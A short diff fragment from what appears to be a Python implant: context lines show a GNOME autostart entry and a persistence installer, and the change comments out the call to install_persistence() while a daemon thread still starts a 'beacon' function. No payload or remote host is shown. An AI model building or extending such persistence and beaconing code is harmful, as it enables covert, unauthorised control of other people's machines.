@@ -182,7 +182,7 @@ X-GNOME-Autostart-enabled=true
     except Exception as e:
         print(f"[PERSISTENCE] Failed: {e}")
 
-install_persistence()
+# install_persistence()
 
 t = threading.Thread(target=beacon, daemon=True)
 t.start()
